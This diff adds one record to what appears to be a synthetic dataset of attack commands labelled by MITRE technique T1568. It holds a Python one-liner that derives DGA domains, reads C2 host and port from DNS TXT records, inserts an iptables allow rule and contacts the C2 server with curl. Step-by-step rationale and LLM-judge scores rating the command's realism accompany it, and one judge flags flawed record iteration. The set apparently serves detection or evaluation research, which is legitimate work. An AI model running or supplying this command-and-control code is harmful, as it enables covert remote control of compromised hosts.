@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='txt-seed'; tlds=['org','com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.md5((base+str(i)).encode()).hexdigest()[:9]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; host=None; port=None; ip=None\nfor d in dga(25):\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='_cfg.'+d,qtype='TXT')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for rr in resp[DNS].an:\n            if getattr(rr,'type',0)==16:\n                try:\n                    txt=rr.rdata.decode() if isinstance(rr.rdata,bytes) else rr.rdata\n                except Exception:\n                    txt=str(rr.rdata)\n                if 'host=' in txt and 'port=' in txt:\n                    host=txt.split('host=')[1].split(',')[0].strip()\n                    port=int(txt.split('port=')[1].split(',')[0].strip())\n                    dom=d; break\n    if host and port: break\nif host and port:\n    r2=sr1(IP(dst='9.9.9.9')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=host,qtype='A')),timeout=3,verbose=0)\n    if r2 and r2[DNS] and r2[DNS].an:\n        for a in r2[DNS].an:\n            if getattr(a,'type',0)==1:\n                ip=a.rdata; break\nif ip:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{host}:{port}:{ip}',f'http://{host}:{port}/k'])\n    print(dom,host,ip,port)\"",
+  "explanation": "Uses a TXT record under a DGA subdomain to dynamically retrieve C2 host and port, then resolves and connects over that configuration.",
+  "rationale_steps": [
+    "Derive DGA domain list based on date and seed.",
+    "Query TXT records to pull C2 configuration (host and port).",
+    "Resolve the provided host to an IP using scapy.",
+    "Allow and probe the C2 IP:port via iptables and curl."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-da4dd9c4",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is well-formed with properly balanced quotes, parentheses, and braces, correct imports, valid function definitions, and proper control flow structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a domain generation algorithm (DGA) to create domains, querying TXT records for C2 configuration, resolving the C2 server IP, and establishing a connection to the retrieved endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:35:22.052638Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with no syntax errors, balanced quoting, valid function calls (Scapy, hashlib, subprocess), and proper variable assignments.",
+        "semantic_score": 4,
+        "semantic_justification": "The command excellently implements DGA and dynamic resolution of C2 host, port, and IP using DNS TXT and A records, and correctly uses `curl --resolve` for connection, but the `iptables` command requires root privileges, contradicting the stated 'Privilege: None' and representing a significant operational realism gap.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:35:41.676001Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python -c payload is fully quoted with balanced delimiters and valid Python syntax, making the command parseable as written.",
+        "semantic_score": 3,
+        "semantic_justification": "It implements DGA-based dynamic resolution via TXT to retrieve C2 config and then resolves/connects, but practical execution is hindered by Scapy raw socket/root requirements, iptables needing root despite declared no privilege, and incorrect iteration over Scapy DNS answer records.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T07:36:05.040009Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
